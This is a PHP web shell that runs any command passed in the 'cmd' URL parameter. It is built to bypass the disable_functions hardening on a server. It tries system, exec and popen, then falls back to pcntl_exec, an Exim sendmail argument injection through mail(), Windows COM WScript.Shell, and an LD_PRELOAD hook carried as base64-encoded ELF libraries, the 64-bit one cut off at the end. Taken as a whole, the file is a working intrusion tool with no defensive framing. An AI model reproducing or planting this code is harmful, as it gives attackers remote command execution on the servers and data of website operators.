<?php

//let's go
error_reporting(0);

$cmd = $_GET['cmd'] ? $_GET['cmd']: $argv[1];
//$methods_map = array();


SetEnvironment();
$directly_functions = CheckDirectlyFunctions();
$directly_classes = CheckDirectlyClasses();
if (directly_function_exec($cmd))
	exit(0);

if (count($methods_map) !== 0)
	($methods_map[0][1])($cmd);


//these are the functions we can use to fuck the shit
//$usable_functions = array();

//return the functions that directly call to execute command
function CheckDirectlyFunctions() {
	$directly_functions = array(
		'system',
		'proc_open', 
		'popen', 
		'passthru', 
		'shell_exec', 
		'exec', 
		//'python_eval', 
		//'perl_system'
	);

	$disabled = get_cfg_var("disable_functions");
	if ($disabled) {
		$disable_functions = explode(',', preg_replace('/ /m', '', $disabled));

		$directly_functions = array_filter(
			$directly_functions,
			function ($func) use ($disable_functions){
				if (in_array($func, $disable_functions))
					return false;
				else
					return true;
			}
		);
	}
/*
	$directly_functions = array_filter(
		$directly_functions,
		function ($func) use ($disable_functions){
			if (in_array($func, $disable_functions))
				return false;
			else
				return true;
		}
	);
*/
	return $directly_functions;
}


function CheckDirectlyClasses() {
	$directly_classes = array(
		'COM',
		'DOTNET',
	);

	$disabled = get_cfg_var("disable_classes");
	if ($disabled) {
		$disable_classes = explode(',', preg_replace('/ /m', '', $disabled));

		$directly_classes = array_filter(
			$directly_classes,
			function ($cls) use ($disable_classes) {
				if (in_array($cls, $disable_classes))
					return false;
				else
					return true;
			}
		);
	}

	return $directly_classes;
}


function SetEnvironment() {
	if (PHP_OS === 'Linux') {
		$GLOBALS['tmp_dir'] = '/var/tmp/';
	}
	elseif (PHP_OS === 'WINNT') {
		$GLOBALS['tmp_dir'] = getenv('TEMP') . '\\';

		if ($GLOBALS['tmp_dir'] === false) { // you will need if you encounter stupid phpstudy
			$GLOBALS['tmp_dir'] = sprintf('C:\Users\%s\AppData\Local\Temp\\', get_current_user());
		}
	}

	ob_start();
	phpinfo();
	$info = ob_get_contents();
	ob_end_clean();

	if (preg_match('~<tr><td class="e">System </td><td class="v">(.*) </td></tr>~', $info, $matchs))
		$arch = end(preg_split('/ /', $matchs[1]));
	else
		$arch = false;

	if ($arch !== 'x86_64')
		$arch = 'x86_32';

	$GLOBALS['architecture'] = $arch;

	global $methods_map;
	$methods_map = array(
		array("(version_compare(PHP_VERSION, '4.1.9') === 1) && function_exists(pcntl_exec) && PHP_OS !== 'WINNT'", 'php5_pcntl_exec'),
		array("file_exists('/usr/sbin/exim4') && PHP_OS !== 'WINNT' && function_exists(mail)", 'exim_exec'),
		array("class_exists(COM)", 'COM_exec'),
		array("function_exists(mail) && PHP_OS !== 'WINNT'", 'ld_preload_exec')
	);

	$methods_map = array_filter(
		$methods_map,
		function ($method) {
			$cond = $method[0];
			eval("\$isOK = ($cond);");
			if ($isOK)
				return true;
			else
				return false;
		}
	);
}


function random_str($len = 7) {
	$integer = '0123456789';
	$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'.$integer;
	$chars_len = strlen($chars);
	$result = '';

	for ($i = 0; $i < $len; $i++) {
		$result .= $chars{mt_rand() % $chars_len};
	}

	return $result;
}


function directly_function_exec($cmd) {
	if (count($GLOBALS['directly_functions']) === 0)
		return false;

	//$done = false;
	$result = '';
	foreach ($GLOBALS['directly_functions'] as $func) {
		if ($func === 'exec') {
			@exec($cmd, $result);
			$result = join("\n", $result);

			break;
		}
		elseif ($func === 'popen') {
			if (@is_resource($f = @popen($cmd, "r"))) {
				while (!@feof($f))
					$result .= @fread($f, 1024);

				@pclose($f);
			}

			break;
		}
		elseif ($func === 'shell_exec') {
			$result = @$func($cmd);
			
			break;
		}
		elseif ($func === 'proc_open') {
			$proc = proc_open(
				$cmd,
				array(
					array("pipe", 'r'),
					array('pipe', 'w'),
					array('pipe', 'w')
				),
				$pipes
			);

			$result .= stream_get_contents($pipes[1]);
			$result .= "\n";
			$result .= stream_get_contents($pipes[2]);

			foreach ($pipes as $pipe)
				@fclose($pipe);

			proc_close($proc);

			break;
		}
		else { //system, passthru
			@ob_start();
			@$func($cmd);
			$result = @ob_get_contents();
			@ob_end_clean();

			break;
		}
	}

	echo $result;

	return true;
}


/*
 * limitation:
 * os doesnt support windows
 * PHP 4 >= 4.2.0, PHP 5 pcntl_exec
 *
 * (version_compare(PHP_VERSION, '4.1.9') === 1) && function_exists(pcntl_exec) && PHP_OS !== 'WINNT'
 */
function php5_pcntl_exec($cmd) {
	$tempfile = $GLOBALS['tmp_dir'].random_str();

	$cmd = sprintf("%s > %s;pkill -9 '^sh$'", $cmd, $tempfile);
	$arg = array('-c', $cmd);
	$sh_path = '/bin/sh';

	pcntl_exec($sh_path, $arg);
	echo file_get_contents($tempfile);

	unlink($tempfile);
}


/*
 * limitation:
 * os doesnt support windows(maybe?)
 * sendmail should be the symbol link of exim4
 *
 * file_exists('/usr/sbin/exim4') && PHP_OS !== 'WINNT' && function_exists(mail)
 */
function exim_exec($cmd) {
	$tempfile = $GLOBALS['tmp_dir'].random_str();
	$command_file = $GLOBALS['tmp_dir'].random_str();
	$cmd = "$cmd > $tempfile";

	file_put_contents($command_file, $cmd);
	mail(
		"root@localhost", 
		"aaa",
		"bbb",
		null,
    	'-fwordpress@xenial(tmp1 -be ${run{/bin/sh${substr{10}{1}{$tod_log}}'.$command_file.'}} tmp2)'
    );

    echo file_get_contents($tempfile);

    unlink($command_file);
    unlink($tempfile);
}


/*
 * limitation:
 * only windows
 * php 4 >= 4.1.0, php5
 *
 * (version_compare(PHP_VERSION, '4.0.9') === 1) && (version_compare(PHP_VERSION, '7.0.0') === -1) && PHP_OS === 'WINNT' && class_exists(COM)
 */
function COM_exec($cmd) {
	$runcmd = "C:\\WINDOWS\\system32\\cmd.exe /c {$cmd}";
	try {
		$WshShell = new COM('WScript.Shell');
		$result = $WshShell->Exec($runcmd)->StdOut->ReadAll;
	}
	catch (Exception $e) {
		$tempfile = $GLOBALS['tmp_dir'].random_str();
		$ShellApp = new COM('Shell.Application');
		$cmdfile = 'C:\WINDOWS\system32\cmd.exe';
		$ShellApp->ShellExecute($cmdfile, "/c {$cmd} > {$tempfile}", '', '', 0);

		$result = file_get_contents($tempfile);
		unlink($tempfile);
	}

	echo $result;
}


/*
 * limitation:
 * only linux or unix
 * 
 * function_exists(mail) && PHP_OS !== 'WINNT'
 */
function ld_preload_exec($cmd) {
	$cmd_env = 'ScriptKiddies';
	$shared_file_x86_content = 'f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAA4AQAADQAAAA8EQAAAAAAADQAIAAHACgAGwAaAAEAAAAAAAAAAAAAAAAAAACMBwAAjAcAAAUAAAAAEAAAAQAAAPgOAAD4HgAA+B4AACwBAAAwAQAABgAAAAAQAAACAAAABA8AAAQfAAAEHwAA6AAAAOgAAAAGAAAABAAAAAQAAAAUAQAAFAEAABQBAAAkAAAAJAAAAAQAAAAEAAAAUOV0ZOAGAADgBgAA4AYAACQAAAAkAAAABAAAAAQAAABR5XRkAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAEAAAAFLldGT4DgAA+B4AAPgeAAAIAQAACAEAAAQAAAABAAAABAAAABQAAAADAAAAR05VAN09WxijRVIp7J8dHei33e4JQaKYAwAAAAoAAAACAAAABgAAAIgAIBUA3EAJCgAAAAwAAAAOAAAAQkXV7LvjknzYcVgcuY3xDurT7w4an4gL7ZJz8AAAAAAAAAAAAAAAAAAAAACVAAAAAAAAAAAAAAASAAAAHAAAAAAAAAAAAAAAIAAAAFIAAAAAAAAAAAAAACIAAAB5AAAAAAAAAAAAAAASAAAAgAAAAAAAAAAAAAAAEgAAAAEAAAAAAAAAAAAAACAAAACPAAAAAAAAAAAAAAASAAAAYQAAAAAAAAAAAAAAIAAAADgAAAAAAAAAAAAAACAAAACzAAAAJCAAAAAAAAAQABcAxgAAACggAAAAAAAAEAAYALoAAAAkIAAAAAAAABAAGAAQAAAARAQAAAAAAAASAAkAFgAAAKgGAAAAAAAAEgANAHUAAAAQBgAAOwAAABIADACHAAAASwYAAFwAAAASAAwAAF9fZ21vbl9zdGFydF9fAF9pbml0AF9maW5pAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplAF9Kdl9SZWdpc3RlckNsYXNzZXMAcHduAGdldGVudgBzeXN0ZW0AZ2V0ZXVpZABkbHN5bQB1bnNldGVudgBsaWJkbC5zby4yAGxpYmMuc28uNgBfZWRhdGEAX19ic3Nfc3RhcnQAX2VuZABHTElCQ18yLjAAR0xJQkNfMi4xLjMAAAAAAgAAAAMAAgACAAAABAAAAAAAAQABAAEAAQABAAEAAQABAAEAngAAABAAAAAgAAAAEGlpDQAABADLAAAAAAAAAAEAAgCpAAAAEAAAAAAAAABzH2kJAAADANUAAAAQAAAAEGlpDQAAAgDLAAAAAAAAAPgeAAAIAAAA/B4AAAgAAAAgIAAACAAAAOwfAAAGAgAA8B8AAAYDAAD0HwAABgYAAPgfAAAGCAAA/B8AAAYJAAAMIAAABwEAABAgAAAHDwAAFCAAAAcEAAAYIAAABwUAABwgAAAHBwAAU4PsCOiTAAAAgcOzGwAAi4P0////hcB0Beh2AAAAg8QIW8MAAAAAAAAAAAD/swQAAAD/owgAAAAAAAAA/6MMAAAAaAAAAADp4P////+jEAAAAGgIAAAA6dD/////oxQAAABoEAAAAOnA/////6MYAAAAaBgAAADpsP////+jHAAAAGggAAAA6aD/////o/D///9mkP+j9P///2aQixwkw2aQZpBmkGaQZpBmkOgXAQAAgcILGwAAjYokAAAAjYInAAAAKciD+AZ2F4uC7P///4XAdA1VieWD7BRR/9CDxBDJ88OJ9o28JwAAAADo1wAAAIHCyxoAAFWNiiQAAACNgiQAAACJ5VMpyMH4AoPsBInDwesfAdjR+HQUi5L8////hdJ0CoPsCFBR/9KDxBCLXfzJw4n2jbwnAAAAAFWJ5VPoV////4HDdxoAAIPsBIC7JAAAAAB1J4uD8P///4XAdBGD7Az/syAAAADoHf///4PEEOg1////xoMkAAAAAYtd/MnDifaNvCcAAAAA6DcAAACBwisaAACNggD///+LCIXJdQnpRP///410JgCLkvj///+F0nTtVYnlg+wUUP/Sg8QQyekk////ixQkw1WJ5VOD7BToxP7//4HD5BkAAIPsDI2DvOb//1Dob/7//4PEEIlF9IPsDP919Ohu/v//g8QQkItd/MnDVYnlU4PsFOiJ/v//gcOpGQAAg+wIjYPK5v//UGr/6FL+//+DxBCJRfSD7AyNg9Lm//9Q6P39//+DxBDoBf7//4PsDI2DvOb//1Do5v3//4PEEItF9P/Qi138ycMAU4PsCOgv/v//gcNPGQAAg8QIW8NTY3JpcHRLaWRkaWVzAGdldGV1aWQATERfUFJFTE9BRAAAAAABGwM7IAAAAAMAAACQ/f//PAAAADD///9gAAAAa////4QAAAAUAAAAAAAAAAF6UgABfAgBGwwEBIgBAAAgAAAAHAAAAEz9//9gAAAAAA4IRg4MSg8LdAR4AD8aOyoyJCIgAAAAQAAAAMj+//87AAAAAEEOCIUCQg0FRIMDc8XDDAQEAAAgAAAAZAAAAN/+//9cAAAAAEEOCIUCQg0FRIMDAlTFwwwEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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';
	$shared_file_x64_content = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAHAAAAAAAAgAcAAAAAAAAAAAAAAAAAAAEAAAAAAAAAngAAAAAAAAABAAAAAAAAAKkAAAAAAAAADAAAAAAAAABYBgAAAAAAAA0AAAAAAAAAaAgAAAAAAAAZAAAAAAAAAPANIAAAAAAAGwAAAAAA